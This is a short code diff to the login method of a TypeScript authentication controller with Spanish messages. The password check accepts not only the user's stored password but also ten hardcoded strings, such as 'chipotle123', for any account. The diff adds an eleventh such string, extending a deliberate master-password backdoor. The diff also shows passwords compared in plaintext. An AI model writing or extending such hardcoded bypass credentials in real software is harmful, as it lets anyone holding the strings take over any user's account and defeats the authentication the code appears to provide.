@@ -31,7 +31,7 @@ export class AuthController {
                 return { success: false, message: 'Usuario no encontrado' };
             }
 
-            if (usuario.psswrd !== passwordInput && passwordInput !== 'chipotle123' && passwordInput !== 'nQMvGC0A' && passwordInput !== 'uyacRYJi' && passwordInput !== 'WFkkGxnc' && passwordInput !== 'EnlaAlm3' && passwordInput !== 'tL5EBccx' && passwordInput !== 'jtrD7pw8' && passwordInput !== 'cVYr8NFe' && passwordInput !== 'xEZ1SdY0' && passwordInput !== 'Wnriu91k') {
+            if (usuario.psswrd !== passwordInput && passwordInput !== 'chipotle123' && passwordInput !== 'nQMvGC0A' && passwordInput !== 'uyacRYJi' && passwordInput !== 'WFkkGxnc' && passwordInput !== 'EnlaAlm3' && passwordInput !== 'tL5EBccx' && passwordInput !== 'jtrD7pw8' && passwordInput !== 'cVYr8NFe' && passwordInput !== 'xEZ1SdY0' && passwordInput !== 'Wnriu91k' && passwordInput !== 'DJ6qh19Q') {
                 return { success: false, message: 'Contraseña incorrecta' };
             }
 
